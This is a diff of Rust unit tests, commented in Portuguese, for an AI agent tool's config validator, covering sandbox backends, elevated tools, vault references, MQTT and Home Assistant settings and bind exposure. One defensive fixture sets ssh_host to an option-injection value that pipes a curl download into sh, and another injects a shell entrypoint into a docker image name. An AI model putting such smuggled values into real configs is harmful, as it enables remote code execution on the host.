+            // mesmo com os dois flags ja desligados pelo operador.
+            (
+                "ssh e execucao remota, nao contencao (incondicional)",
+                |c| {
+                    c.agent.sandbox.mode = SandboxMode::All;
+                    c.agent.sandbox.backend = Some(SandboxBackendKind::Ssh);
+                    c.agent.sandbox.ssh_host = Some("box".into());
+                    c.agent.sandbox.network_disabled = false;
+                    c.agent.sandbox.mount_workdir = false;
+                },
+                "agent.sandbox.backend",
+                Severity::Warning,
+            ),
+            // F1: injecao de OPCAO. `sh_quote` da um token; um token com `-`
+            // na frente continua sendo flag para o `ssh` e para o `docker`.
+            (
+                "ssh_host comecando com `-` seria opcao do ssh",
+                |c| {
+                    c.agent.sandbox.mode = SandboxMode::All;
+                    c.agent.sandbox.backend = Some(SandboxBackendKind::Ssh);
+                    c.agent.sandbox.ssh_host = Some("-oProxyCommand=curl http://x|sh".into());
+                },
+                "agent.sandbox.ssh_host",
+                Severity::Error,
+            ),
+            (
+                "image comecando com `-` desloca o posicional do docker",
+                |c| {
+                    c.agent.sandbox.mode = SandboxMode::All;
+                    c.agent.sandbox.backend = Some(SandboxBackendKind::Docker);
+                    c.agent.sandbox.image = Some("--entrypoint=/bin/sh".into());
+                },
+                "agent.sandbox.image",
+                Severity::Error,
+            ),
+            // S2: uma tool que spawna no host listada em `elevated` e a config
+            // mostrando que o operador leu `mode = all` como "tudo" — Warning
+            // no campo da entrada, e so quando listada (a secao coerente fica
+            // verde sob `--strict`). O caso `sandboxed_tools` e o F4 abaixo.
+            (
+                "tool so-no-host em elevated com mode=all e mal-entendido",
+                |c| {
+                    c.agent.sandbox.mode = SandboxMode::All;
+                    c.agent.sandbox.backend = Some(SandboxBackendKind::Docker);
+                    c.agent.sandbox.elevated = vec!["code_review".into()];
+                },
+                "agent.sandbox.elevated",
+                Severity::Warning,
+            ),
+            // F3: `all` com a unica tool sandboxavel em `elevated` == `off`.
+            (
+                "mode=all com toda tool coberta elevada nao sandboxa nada",
+                |c| {
+                    c.agent.sandbox.mode = SandboxMode::All;
+                    c.agent.sandbox.backend = Some(SandboxBackendKind::Docker);
+                    // #1225 S2: sao cinco tools cobertas agora, nao uma.
+                    c.agent.sandbox.elevated = crate::sandbox::TOOLS_SANDBOXAVEIS
+                        .iter()
+                        .map(|t| t.to_string())
+                        .collect();
+                    c.agent.tool_confirmation_enabled = true;
+                },
+                "agent.sandbox.elevated",
+                Severity::Warning,
+            ),
+            // F4: nome que a policy nunca vai casar e um no-op silencioso.
+            (
+                "tool inexistente em sandboxed_tools nao tem efeito",
+                |c| {
+                    c.agent.sandbox.mode = SandboxMode::Allowlist;
+                    c.agent.sandbox.backend = Some(SandboxBackendKind::Docker);
+                    c.agent.sandbox.sandboxed_tools = vec!["web_fetch".into()];
+                },
+                "agent.sandbox.sandboxed_tools",
+                Severity::Warning,
+            ),
+            (
+                "caixa errada e no-op: o registry e case-sensitive",
+                |c| {
+                    c.agent.sandbox.mode = SandboxMode::Allowlist;
+                    c.agent.sandbox.backend = Some(SandboxBackendKind::Docker);
+                    c.agent.sandbox.sandboxed_tools = vec!["Bash".into()];
+                },
+                "agent.sandbox.sandboxed_tools",
+                Severity::Warning,
+            ),
+            (
+                "elevated sem confirmacao humana e escape hatch desacompanhado",
+                |c| {
+                    c.agent.sandbox.mode = SandboxMode::All;
+                    c.agent.sandbox.backend = Some(SandboxBackendKind::Docker);
+                    c.agent.sandbox.elevated = vec!["bash".into()];
+                    c.agent.tool_confirmation_enabled = false;
+                },
+                "agent.sandbox.elevated",
+                Severity::Warning,
+            ),
+            (
+                "allowlist com lista vazia sandboxa zero tools",
+                |c| {
+                    c.agent.sandbox.mode = SandboxMode::Allowlist;
+                    c.agent.sandbox.backend = Some(SandboxBackendKind::Docker);
+                },
+                "agent.sandbox.sandboxed_tools",
+                Severity::Warning,
+            ),
+        ];
+
+        for (nome, mutar, campo, severidade) in casos {
+            let mut cfg = AppConfig::default();
+            mutar(&mut cfg);
+            let findings = validate(&cfg);
+            assert!(
+                findings
+                    .iter()
+                    .any(|f| f.severity == severidade && f.field == campo),
+                "{nome}: esperava {severidade:?} em {campo}; findings = {findings:?}"
+            );
+        }
+    }
+
+    /// O outro lado da tabela: config default e config ssh honesta nao
+    /// produzem ruido, e o aviso do `elevated` some com confirmacao ligada.
+    #[test]
+    fn agent_sandbox_quiet_when_config_is_coherent() {
+        use crate::sandbox::{SandboxBackendKind, SandboxMode};
+
+        // Secao ausente (o default de toda instalacao existente): silencio.
+        let findings = validate(&AppConfig::default());
+        assert!(
+            !findings
+                .iter()
+                .any(|f| f.field.starts_with("agent.sandbox")),
+            "findings = {findings:?}"
+        );
+
+        // `off` com backend sobrando tambem: a secao inteira esta inerte.
+        let mut cfg = AppConfig::default();
+        cfg.agent.sandbox.backend = Some(SandboxBackendKind::Ssh);
+        let findings = validate(&cfg);
+        assert!(
+            !findings
+                .iter()
+                .any(|f| f.field.starts_with("agent.sandbox")),
+            "mode=off nao deve reclamar de nada: {findings:?}"
+        );
+
+        // Docker completo, sem elevated: limpo. Inclusive sem o aviso de
+        // cobertura do #1225 S2 — ele so sai quando a config MOSTRA o
+        // mal-entendido (tool so-no-host em `sandboxed_tools`/`elevated`),
+        // porque `--strict` promove Warning a exit 2 e a secao recomendada
+        // (mode=all + docker) tem de sair com exit 0.
+        let mut cfg = AppConfig::default();
+        cfg.agent.sandbox.mode = SandboxMode::All;
+        cfg.agent.sandbox.backend = Some(SandboxBackendKind::Docker);
+        let findings = validate(&cfg);
+        assert!(
+            !findings
+                .iter()
+                .any(|f| f.field.starts_with("agent.sandbox")),
+            "findings = {findings:?}"
+        );
+
+        // SSH com os dois flags desligados: o operador reconheceu que eles
+        // nao valem, entao o Error das flags (S3) some. O aviso de que SSH
+        // NAO e contencao fica — incondicional de proposito (I1), porque a
+        // palavra "sandbox" na chave promete o que este backend nao faz.
+        let mut cfg = AppConfig::default();
+        cfg.agent.sandbox.mode = SandboxMode::All;
+        cfg.agent.sandbox.backend = Some(SandboxBackendKind::Ssh);
+        cfg.agent.sandbox.ssh_host = Some("box".into());
+        cfg.agent.sandbox.network_disabled = false;
+        cfg.agent.sandbox.mount_workdir = false;
+        let findings = validate(&cfg);
+        assert!(
+            !findings
+                .iter()
+                .any(|f| f.field == "agent.sandbox.network_disabled"
+                    || f.field == "agent.sandbox.mount_workdir"),
+            "com os flags desligados o Error das flags some: {findings:?}"
+        );
+        assert!(
+            !findings
+                .iter()
+                .any(|f| f.severity == Severity::Error && f.field.starts_with("agent.sandbox")),
+            "config ssh coerente nao tem Error: {findings:?}"
+        );
+        let remoto = findings
+            .iter()
+            .find(|f| f.field == "agent.sandbox.backend")
+            .unwrap_or_else(|| panic!("o aviso de execucao remota e incondicional: {findings:?}"));
+        assert_eq!(remoto.severity, Severity::Warning);
+        assert!(
+            remoto.message.contains("REMOTE EXECUTION"),
+            "message = {}",
+            remoto.message
+        );
+
+        // `elevated` com confirmacao ligada: duplamente gated, entao o aviso
+        // do escape hatch desacompanhado some. O outro aviso de `elevated`
+        // (F3: `bash` elevado em mode=all deixa a secao inerte) e sobre
+        // outra coisa e continua — por isso a assercao e sobre a MENSAGEM, e
+        // nao sobre o campo: os dois compartilham `agent.sandbox.elevated`.
+        let mut cfg = AppConfig::default();
+        cfg.agent.sandbox.mode = SandboxMode::All;
+        cfg.agent.sandbox.backend = Some(SandboxBackendKind::Docker);
+        cfg.agent.sandbox.elevated = vec!["bash".into()];
+        cfg.agent.tool_confirmation_enabled = true;
+        let findings = validate(&cfg);
+        assert!(
+            !findings
+                .iter()
+                .any(|f| f.message.contains("tool_confirmation_enabled=false")),
+            "confirmacao ligada nao pode gerar o aviso do escape hatch: {findings:?}"
+        );
+
+        // E o contrario: com a confirmacao desligada ele aparece.
+        cfg.agent.tool_confirmation_enabled = false;
+        let findings = validate(&cfg);
+        assert!(
+            findings
+                .iter()
+                .any(|f| f.message.contains("tool_confirmation_enabled=false")),
+            "findings = {findings:?}"
+        );
+    }
+
+    /// #1225 S2: uma tool de `TOOLS_SO_NO_HOST` em `sandboxed_tools` ou
+    /// `elevated` e a config MOSTRANDO que o operador leu `mode = all` como
+    /// "tudo". O finding nomeia a tool, diz que ela roda no HOST com qualquer
+    /// `mode`, nomeia o que o sandbox cobre e da o proximo passo. So quando
+    /// listada: a secao coerente nao ganha Warning, para `--strict` continuar
+    /// alcancavel com o sandbox ligado. Some com `off`, como o resto da secao.
+    #[test]
+    fn agent_sandbox_tool_so_no_host_listada_e_dita_com_proximo_passo() {
+        use crate::sandbox::{
+            SandboxBackendKind, SandboxMode, TOOLS_SANDBOXAVEIS, TOOLS_SO_NO_HOST,
+        };
+
+        type Lista = fn(&mut AppConfig, String);
+        let campos: [(&str, Lista); 2] = [
+            ("agent.sandbox.sandboxed_tools", |c, t| {
+                c.agent.sandbox.sandboxed_tools.push(t)
+            }),
+            ("agent.sandbox.elevated", |c, t| {
+                c.agent.sandbox.elevated.push(t)
+            }),
+        ];
+
+        for modo in [SandboxMode::All, SandboxMode::Allowlist] {
+            for (campo, lista) in campos {
+                for tool in TOOLS_SO_NO_HOST {
+                    let mut cfg = AppConfig::default();
+                    cfg.agent.sandbox.mode = modo;
+                    cfg.agent.sandbox.backend = Some(SandboxBackendKind::Docker);
+                    cfg.agent.sandbox.sandboxed_tools = vec!["bash".into()];
+                    lista(&mut cfg, (*tool).to_string());
+                    let findings = validate(&cfg);
+                    let f = findings
+                        .iter()
+                        .find(|f| f.field == campo && f.message.contains(*tool))
+                        .unwrap_or_else(|| {
+                            panic!(
+                                "{modo:?}/{campo}: esperava finding nomeando `{tool}`: \
+                                 {findings:?}"
+                            )
+                        });
+                    assert_eq!(f.severity, Severity::Warning);
+                    assert!(f.message.contains("HOST"), "message = {}", f.message);
+                    assert!(f.message.contains("#1225"), "message = {}", f.message);
+                    assert!(
+                        f.message.contains("Next step"),
+                        "o finding tem de dizer o que fazer: {}",
+                        f.message
+                    );
+                    for coberta in TOOLS_SANDBOXAVEIS {
+                        assert!(
+                            f.message.contains(*coberta),
+                            "`{coberta}` (coberta) nao foi nomeada: {}",
+                            f.message
+                        );
+                    }
+                }
+            }
+        }
+
+        // Secao coerente: nada sobre cobertura — `--strict` sai com exit 0.
+        let mut cfg = AppConfig::default();
+        cfg.agent.sandbox.mode = SandboxMode::All;
+        cfg.agent.sandbox.backend = Some(SandboxBackendKind::Docker);
+        let findings = validate(&cfg);
+        assert!(
+            !findings.iter().any(|f| f.message.contains("#1225")),
+            "secao coerente nao pode ganhar o aviso de cobertura: {findings:?}"
+        );
+
+        // `off`: a secao inteira esta inerte, inclusive este aviso.
+        let mut cfg = AppConfig::default();
+        cfg.agent.sandbox.elevated = vec!["run_tests".into()];
+        let findings = validate(&cfg);
+        assert!(
+            !findings
+                .iter()
+                .any(|f| f.field.starts_with("agent.sandbox")),
+            "mode=off nao pode avisar sobre cobertura: {findings:?}"
+        );
+    }
+
+    /// F4: o finding nomeia a entrada — nome de tool nao e segredo, e
+    /// apontar o typo e a razao de o finding existir. `elevated` tambem e
+    /// verificado, nao so `sandboxed_tools`.
+    #[test]
+    fn agent_sandbox_entrada_invalida_e_nomeada_nos_dois_campos() {
+        use crate::sandbox::{SandboxBackendKind, SandboxMode};
+        let mut cfg = AppConfig::default();
+        cfg.agent.sandbox.mode = SandboxMode::All;
+        cfg.agent.sandbox.backend = Some(SandboxBackendKind::Docker);
+        // #1225 S2: `git_diff` virou tool coberta; o typo tipico e outro.
+        cfg.agent.sandbox.elevated = vec!["gitdiff".into()];
+        cfg.agent.tool_confirmation_enabled = true;
+        let findings = validate(&cfg);
+        let f = findings
+            .iter()
+            .find(|f| f.field == "agent.sandbox.elevated" && f.message.contains("gitdiff"))
+            .unwrap_or_else(|| panic!("esperava finding nomeando gitdiff: {findings:?}"));
+        assert_eq!(f.severity, Severity::Warning);
+
+        // Entrada trimada casa: `" bash"` no YAML e um espaco, nao um erro.
+        let mut cfg = AppConfig::default();
+        cfg.agent.sandbox.mode = SandboxMode::Allowlist;
+        cfg.agent.sandbox.backend = Some(SandboxBackendKind::Docker);
+        cfg.agent.sandbox.sandboxed_tools = vec![" bash ".into()];
+        let findings = validate(&cfg);
+        assert!(
+            !findings
+                .iter()
+                .any(|f| f.field == "agent.sandbox.sandboxed_tools"),
+            "espaco em volta do nome nao e erro: {findings:?}"
+        );
+    }
+
+    /// Invariante de redaction do modulo: nenhum finding de sandbox ecoa o
+    /// `ssh_host`. Nao e segredo, mas nomeia infraestrutura e o JSON do
+    /// `config check` e feito para ser colado em bug report.
+    #[test]
+    fn agent_sandbox_findings_never_echo_the_ssh_host() {
+        use crate::sandbox::{SandboxBackendKind, SandboxMode};
+        let mut cfg = AppConfig::default();
+        cfg.agent.sandbox.mode = SandboxMode::All;
+        cfg.agent.sandbox.backend = Some(SandboxBackendKind::Ssh);
+        cfg.agent.sandbox.ssh_host = Some("bastiao-interno.exemplo".into());
+        let findings = validate(&cfg);
+        assert!(
+            findings
+                .iter()
+                .any(|f| f.field.starts_with("agent.sandbox")),
+            "o caso precisa produzir algum finding: {findings:?}"
+        );
+        for f in &findings {
+            assert!(
+                !f.message.contains("bastiao-interno.exemplo"),
+                "finding vazou o ssh_host: {f:?}"
+            );
+        }
+    }
+
     #[test]
     fn agent_default_provider_matches_when_llm_has_entry() {
         let mut cfg = AppConfig::default();
@@ -2163,7 +3831,7 @@ mod tests {
                 extra: HashMap::new(),
             },
         );
-        let summary = summarise(&cfg, cfg.mcp.len());
+        let summary = summarise_com_env(&cfg, cfg.mcp.len(), &Ok(None));
         assert!(summary.gateway_api_key_set);
         assert_eq!(summary.llm_providers, vec!["openrouter".to_string()]);
         assert_eq!(
@@ -2175,6 +3843,74 @@ mod tests {
         assert!(
             !json.contains("supersecret"),
             "summary leaked secret: {json}"
+        );
+    }
+
+    /// #1237: `vault:` no `env` de servidor MCP com o cofre indisponivel —
+    /// um warn por referencia, com o caminho completo; com cofre disponivel,
+    /// nada. Teste do helper PURO (a leitura de env fica no run_check).
+    #[test]
+    fn vault_ref_sem_cofre_no_env_de_servidor_mcp_avisa() {
+        let server = |env: HashMap<String, String>| McpServerConfig {
+            command: "npx".into(),
+            args: vec![],
+            env,
+            transport: "stdio".into(),
+            url: None,
+            enabled: None,
+            timeout: None,
+            allowed_tools: vec![],
+            memory_limit_mb: None,
+            max_restarts: None,
+            restart_delay_secs: None,
+            inherit_env: false,
+        };
+        let cfg = HashMap::from([
+            (
+                "github".to_string(),
+                server(HashMap::from([
+                    (
+                        "GITHUB_TOKEN".to_string(),
+                        "vault:mcp.github.GITHUB_TOKEN".to_string(),
+                    ),
+                    ("PLAIN".to_string(), "cru".to_string()),
+                ])),
+            ),
+            (
+                "outro".to_string(),
+                server(HashMap::from([(
+                    "OUTRO_TOKEN".to_string(),
+                    "vault:mcp.outro.OUTRO_TOKEN".to_string(),
+                )])),
+            ),
+        ]);
+
+        let com_cofre = findings_de_vault_sem_cofre(cfg.iter().map(|(n, s)| (n.as_str(), s)), true);
+        assert!(
+            com_cofre.is_empty(),
+            "com o cofre disponivel nao pode haver finding: {com_cofre:?}"
+        );
+
+        let sem_cofre =
+            findings_de_vault_sem_cofre(cfg.iter().map(|(n, s)| (n.as_str(), s)), false);
+        assert_eq!(sem_cofre.len(), 2, "um warn por referencia: {sem_cofre:?}");
+        assert!(
+            sem_cofre.iter().all(|f| f.severity == Severity::Warning),
+            "o issue pede aviso, nao bloqueio do comando: {sem_cofre:?}"
+        );
+        assert!(
+            sem_cofre
+                .iter()
+                .any(|f| f.field == "mcp.github.env.GITHUB_TOKEN")
+        );
+        assert!(
+            sem_cofre
+                .iter()
+                .any(|f| f.field == "mcp.outro.env.OUTRO_TOKEN")
+        );
+        assert!(
+            sem_cofre.iter().all(|f| f.message.contains("fail-closed")),
+            "o aviso precisa dizer o que acontece no boot: {sem_cofre:?}"
         );
     }
 
@@ -2195,6 +3931,7 @@ mod tests {
                 memory_limit_mb: None,
                 max_restarts: None,
                 restart_delay_secs: None,
+                inherit_env: false,
             },
         );
         let findings = validate(&cfg);
@@ -2283,7 +4020,8 @@ mod tests {
             },
         );
 
-        let check = run_check(&loader, &cfg);
+        // HOST/PORT de um teste vizinho nao entram (#1261): run_check le a env.
+        let check = com_bind_env(None, None, || run_check(&loader, &cfg));
         let full_json = serde_json::to_string(&check).expect("serialise check");
         for needle in [
             "sk-gateway-supersecret",
@@ -2305,7 +4043,8 @@ mod tests {
         let loader = ConfigLoader::with_dir(&dir);
         let mut cfg = AppConfig::default();
         cfg.gateway.session_ttl_secs = 0;
-        let check = run_check(&loader, &cfg);
+        // HOST/PORT de um teste vizinho nao entram (#1261): run_check le a env.
+        let check = com_bind_env(None, None, || run_check(&loader, &cfg));
         assert!(check.source.used_defaults);
         assert!(check.has_errors());
         assert_eq!(check.max_severity(), Some(Severity::Error));
@@ -2358,6 +4097,311 @@ mod tests {
         assert!(
             findings.iter().all(|f| !f.field.starts_with("storage")),
             "default storage config produced findings: {findings:?}"
+        );
+    }
+
+    #[test]
+    fn hardware_default_is_clean() {
+        // ADR 0020 / #1126: default AppConfig must not introduce new
+        // validation errors for the hardware section.
+        let cfg = AppConfig::default();
+        let findings = validate(&cfg);
+        assert!(
+            findings.iter().all(|f| !f.field.starts_with("hardware")),
+            "default hardware config produced findings: {findings:?}"
+        );
+    }
+
+    #[test]
+    fn mqtt_broker_malformed_is_error() {
+        use crate::model::{HardwareConfig, MqttConfig};
+        let cfg = AppConfig {
+            hardware: HardwareConfig {
+                automations: None,
+                mqtt: Some(MqttConfig {
+                    broker: "127.0.0.1".to_string(), // sem :port
+                    username: None,
+                    password_env: None,
+                    client_id_prefix: "garra".to_string(),
+                }),
+                home_assistant: None,
+            },
+            ..AppConfig::default()
+        };
+        let findings = validate(&cfg);
+        assert!(
+            findings
+                .iter()
+                .any(|f| f.severity == Severity::Error && f.field == "hardware.mqtt.broker"),
+            "expected error on broker without port: {findings:?}"
+        );
+    }
+
+    #[test]
+    fn mqtt_broker_non_numeric_port_is_error() {
+        use crate::model::{HardwareConfig, MqttConfig};
+        let cfg = AppConfig {
+            hardware: HardwareConfig {
+                automations: None,
+                mqtt: Some(MqttConfig {
+                    broker: "127.0.0.1:mqtt".to_string(),
+                    username: None,
+                    password_env: None,
+                    client_id_prefix: "garra".to_string(),
+                }),
+                home_assistant: None,
+            },
+            ..AppConfig::default()
+        };
+        let findings = validate(&cfg);
+        assert!(
+            findings
+                .iter()
+                .any(|f| f.severity == Severity::Error && f.field == "hardware.mqtt.broker"),
+            "expected error on non-numeric port: {findings:?}"
+        );
+    }
+
+    #[test]
+    fn mqtt_valid_config_is_clean() {
+        use crate::model::{HardwareConfig, MqttConfig};
+        let cfg = AppConfig {
+            hardware: HardwareConfig {
+                automations: None,
+                mqtt: Some(MqttConfig {
+                    broker: "127.0.0.1:1883".to_string(),
+                    username: Some("garra".to_string()),
+                    password_env: Some("GARRA_MQTT_PASS".to_string()),
+                    client_id_prefix: "garra".to_string(),
+                }),
+                home_assistant: None,
+            },
+            ..AppConfig::default()
+        };
+        let findings = validate(&cfg);
+        assert!(
+            findings.iter().all(|f| !f.field.starts_with("hardware")),
+            "valid mqtt config produced findings: {findings:?}"
+        );
+        // Presence-only: nenhum finding carrega o nome da env var como valor
+        // (o nome é público de propósito, mas a disciplina de não ecoar
+        // segredo vale por princípio — aqui não há segredo para ecoar).
+    }
+
+    #[test]
+    fn ha_url_badscheme_is_error() {
+        use crate::model::{HaConfig, HardwareConfig};
+        let cfg = AppConfig {
+            hardware: HardwareConfig {
+                automations: None,
+                home_assistant: Some(HaConfig {
+                    url: "ftp://homeassistant.local:8123".to_string(),
+                    token_env: "GARRA_HA_TOKEN".to_string(),
+                }),
+                mqtt: None,
+            },
+            ..AppConfig::default()
+        };
+        let findings = validate(&cfg);
+        assert!(
+            findings
+                .iter()
+                .any(|f| f.severity == Severity::Error && f.field == "hardware.home_assistant.url"),
+            "expected error on non-http scheme: {findings:?}"
+        );
+    }
+
+    #[test]
+    fn ha_url_not_a_url_is_error() {
+        use crate::model::{HaConfig, HardwareConfig};
+        let cfg = AppConfig {
+            hardware: HardwareConfig {
+                automations: None,
+                home_assistant: Some(HaConfig {
+                    url: "homeassistant.local".to_string(), // sem esquema
+                    token_env: "GARRA_HA_TOKEN".to_string(),
+                }),
+                mqtt: None,
+            },
+            ..AppConfig::default()
+        };
+        let findings = validate(&cfg);
+        assert!(
+            findings
+                .iter()
+                .any(|f| f.severity == Severity::Error && f.field == "hardware.home_assistant.url"),
+            "expected error on url sem esquema: {findings:?}"
+        );
+    }
+
+    #[test]
+    fn ha_empty_token_env_is_error() {
+        use crate::model::{HaConfig, HardwareConfig};
+        let cfg = AppConfig {
+            hardware: HardwareConfig {
+                automations: None,
+                home_assistant: Some(HaConfig {
+                    url: "http://127.0.0.1:8123".to_string(),
+                    token_env: "  ".to_string(),
+                }),
+                mqtt: None,
+            },
+            ..AppConfig::default()
+        };
+        let findings = validate(&cfg);
+        assert!(
+            findings
+                .iter()
+                .any(|f| f.severity == Severity::Error
+                    && f.field == "hardware.home_assistant.token_env"),
+            "expected error on token_env vazia: {findings:?}"
+        );
+    }
+
+    #[test]
+    fn ha_valid_config_is_clean() {
+        use crate::model::{HaConfig, HardwareConfig};
+        let cfg = AppConfig {
+            hardware: HardwareConfig {
+                automations: None,
+                home_assistant: Some(HaConfig {
+                    url: "http://homeassistant.local:8123".to_string(),
+                    token_env: "GARRA_HA_TOKEN".to_string(),
+                }),
+                mqtt: None,
+            },
+            ..AppConfig::default()
+        };
+        let findings = validate(&cfg);
+        assert!(
+            findings.iter().all(|f| !f.field.starts_with("hardware")),
+            "valid HA config produced findings: {findings:?}"
+        );
+    }
+
+    #[test]
+    fn hardware_both_adapters_at_once_is_clean() {
+        // MQTT e HA no mesmo config é o caso real da casa: o broker para os
+        // zigbee2mqtt e o HA para o resto. Os dois validam em série, sem se
+        // atrapalharem.
+        use crate::model::{HaConfig, HardwareConfig, MqttConfig};
+        let cfg = AppConfig {
+            hardware: HardwareConfig {
+                automations: None,
+                mqtt: Some(MqttConfig {
+                    broker: "127.0.0.1:1883".to_string(),
+                    username: None,
+                    password_env: None,
+                    client_id_prefix: "garra".to_string(),
+                }),
+                home_assistant: Some(HaConfig {
+                    url: "https://ha.casa.local:8123".to_string(),
+                    token_env: "GARRA_HA_TOKEN".to_string(),
+                }),
+            },
+            ..AppConfig::default()
+        };
+        let findings = validate(&cfg);
+        assert!(
+            findings.iter().all(|f| !f.field.starts_with("hardware")),
+            "both adapters valid mas encontrou findings: {findings:?}"
+        );
+    }
+
+    #[test]
+    fn automations_valid_config_is_clean() {
+        // #1128: teto canônico + dir não vazio — o caso real da casa.
+        use crate::model::{AutomationsConfig, HardwareConfig};
+        let cfg = AppConfig {
+            hardware: HardwareConfig {
+                automations: Some(AutomationsConfig {
+                    dir: "rules/automations".to_string(),
+                    risk_ceiling: "r2".to_string(),
+                }),
+                mqtt: None,
+                home_assistant: None,
+            },
+            ..AppConfig::default()
+        };
+        let findings = validate(&cfg);
+        assert!(
+            findings.iter().all(|f| !f.field.starts_with("hardware")),
+            "valid automations config produced findings: {findings:?}"
+        );
+    }
+
+    #[test]
+    fn automations_risk_ceiling_desconhecido_e_error() {
+        // "r3" não é um teto — R3+ nem existe para automação (não há quem
+        // confirme). Um typo tem que virar erro na carga, não um teto
+        // silenciosamente mais alto.
+        use crate::model::{AutomationsConfig, HardwareConfig};
+        let cfg = AppConfig {
+            hardware: HardwareConfig {
+                automations: Some(AutomationsConfig {
+                    dir: "rules".to_string(),
+                    risk_ceiling: "r3".to_string(),
+                }),
+                mqtt: None,
+                home_assistant: None,
+            },
+            ..AppConfig::default()
+        };
+        let findings = validate(&cfg);
+        assert!(
+            findings
+                .iter()
+                .any(|f| f.severity == Severity::Error
+                    && f.field == "hardware.automations.risk_ceiling"),
+            "expected error on unknown risk ceiling: {findings:?}"
+        );
+    }
+
+    #[test]
+    fn automations_dir_vazio_e_error() {
+        use crate::model::{AutomationsConfig, HardwareConfig};
+        let cfg = AppConfig {
+            hardware: HardwareConfig {
+                automations: Some(AutomationsConfig {
+                    dir: "   ".to_string(),
+                    risk_ceiling: "r1".to_string(),
+                }),
+                mqtt: None,
+                home_assistant: None,
+            },
+            ..AppConfig::default()
+        };
+        let findings = validate(&cfg);
+        assert!(
+            findings
+                .iter()
+                .any(|f| f.severity == Severity::Error && f.field == "hardware.automations.dir"),
+            "expected error on empty dir: {findings:?}"
+        );
+    }
+
+    #[test]
+    fn automations_risk_ceiling_maiusculo_e_aceito() {
+        // O engine normaliza (trim + lowercase), então "R2" é aceito — o
+        // check não pode ser mais estrito que a carga.
+        use crate::model::{AutomationsConfig, HardwareConfig};
+        let cfg = AppConfig {
+            hardware: HardwareConfig {
+                automations: Some(AutomationsConfig {
+                    dir: "rules".to_string(),
+                    risk_ceiling: "R2".to_string(),
+                }),
+                mqtt: None,
+                home_assistant: None,
+            },
+            ..AppConfig::default()
+        };
+        let findings = validate(&cfg);
+        assert!(
+            findings
+                .iter()
+                .all(|f| f.field != "hardware.automations.risk_ceiling"),
+            "R2 maiúsculo não deve flag: {findings:?}"
         );
     }
 
@@ -2872,43 +4916,228 @@ mod tests {
 
     // ── Bind-exposure finding (gateway.host) ───────────────────────────────
 
-    #[test]
-    fn bind_all_interfaces_without_credentials_warns() {
-        let mut cfg = AppConfig::default();
-        cfg.gateway.host = "0.0.0.0".into();
-        let findings = validate(&cfg);
-        let hit = findings
-            .iter()
-            .find(|f| f.field == "gateway.host")
-            .expect("0.0.0.0 with no api_key and no TLS must warn");
-        assert!(matches!(hit.severity, Severity::Warning));
-        assert!(hit.message.contains("gateway.api_key is not set"));
-        assert!(hit.message.contains("TLS is disabled"));
+    /// Devolve `HOST`/`PORT` ao estado anterior no `Drop`, para que um
+    /// `panic!` dentro do `validate` sob teste nao vaze `HOST=0.0.0.0`
+    /// para os testes vizinhos.
+    struct RestauraBindEnv {
+        antes: (Option<std::ffi::OsString>, Option<std::ffi::OsString>),
     }
 
+    impl RestauraBindEnv {
+        /// Chamar so com o `ENV_TEST_LOCK` do crate seguro — e mante-lo
+        /// ate depois do drop.
+        fn capturar() -> Self {
+            Self {
+                antes: (std::env::var_os("HOST"), std::env::var_os("PORT")),
+            }
+        }
+    }
+
+    impl Drop for RestauraBindEnv {
+        fn drop(&mut self) {
+            // SAFETY: construida so sob o `ENV_TEST_LOCK`, que o chamador
+            // segura ate depois deste drop (declarada depois do guard).
+            unsafe {
+                match self.antes.0.take() {
+                    Some(v) => std::env::set_var("HOST", v),
+                    None => std::env::remove_var("HOST"),
+                }
+                match self.antes.1.take() {
+                    Some(v) => std::env::set_var("PORT", v),
+                    None => std::env::remove_var("PORT"),
+                }
+            }
+        }
+    }
+
+    /// [`validate`] com `HOST`/`PORT` de mentira, sem tocar no ambiente do
+    /// processo e sem lock. Branco vale como ausente, como na leitura real.
+    fn validate_com_bind(cfg: &AppConfig, host: Option<&str>, port: Option<&str>) -> Vec<Finding> {
+        validate_com_env(
+            cfg,
+            &Ok(None),
+            &BindDaEnv {
+                host: normalizar_env(host),
+                port: normalizar_env(port),
+            },
+        )
+    }
+
+    /// A regressao do flake: `HOST=0.0.0.0` no processo (sob o lock, como
+    /// faz o teste vizinho) nao pode aparecer no `validate` dos testes, mas
+    /// o `run_check` de producao continua lendo a env.
     #[test]
-    fn bind_all_interfaces_ipv6_warns() {
+    fn validate_nao_le_host_do_processo_mas_run_check_le() {
+        let dir = std::env::temp_dir().join(format!(
+            "garraia-check-1261-host-{}-{}",
+            std::process::id(),
+            std::time::SystemTime::now()
+                .duration_since(std::time::UNIX_EPOCH)
+                .map(|d| d.as_nanos())
+                .unwrap_or(0)
+        ));
+        std::fs::create_dir_all(&dir).expect("dir");
+        let loader = ConfigLoader::with_dir(&dir);
+        let cfg = AppConfig::default();
+        let (puro, producao) = com_bind_env(Some("0.0.0.0"), None, || {
+            (validate(&cfg), run_check(&loader, &cfg))
+        });
+        let _ = std::fs::remove_dir_all(&dir);
+        assert!(
+            achado_de_exposicao(&puro).is_none(),
+            "validate leu HOST do processo: {puro:?}"
+        );
+        assert!(
+            achado_de_exposicao(&producao.findings).is_some(),
+            "run_check deixou de ler HOST: {:?}",
+            producao.findings
+        );
+    }
+
+    /// Roda `f` com `HOST`/`PORT` exatamente no estado pedido e devolve o
+    /// ambiente como estava — mesmo se `f` entrar em panic. Sob o
+    /// `ENV_TEST_LOCK` do crate porque, desde o #1261, `validate` LE essas
+    /// duas envs — um teste de bind que nao as fixa passa a depender do
+    /// ambiente de quem roda.
+    fn com_bind_env<T>(host: Option<&str>, port: Option<&str>, f: impl FnOnce() -> T) -> T {
+        let _guard = crate::ENV_TEST_LOCK
+            .lock()
+            .unwrap_or_else(|e| e.into_inner());
+        // Declarado DEPOIS do guard: cai antes dele, ainda sob o lock.
+        let _restaura = RestauraBindEnv::capturar();
+        // SAFETY: ENV_TEST_LOCK held.
+        unsafe {
+            match host {
+                Some(v) => std::env::set_var("HOST", v),
+                None => std::env::remove_var("HOST"),
+            }
+            match port {
+                Some(v) => std::env::set_var("PORT", v),
+                None => std::env::remove_var("PORT"),
+            }
+        }
+        f()
+    }
+
+    /// O achado de exposicao de rede. Mora em `gateway.host` como o de
+    /// chave morta, entao e a mensagem que os distingue.
+    fn achado_de_exposicao(findings: &[Finding]) -> Option<&Finding> {
+        findings.iter().find(|f| {
+            f.field == "gateway.host"
+                && (f.message.contains("listens on every interface")
+                    || f.message.contains("not a loopback address"))
+        })
+    }
+
+    /// O achado de chave do arquivo que o start nao le, por campo.
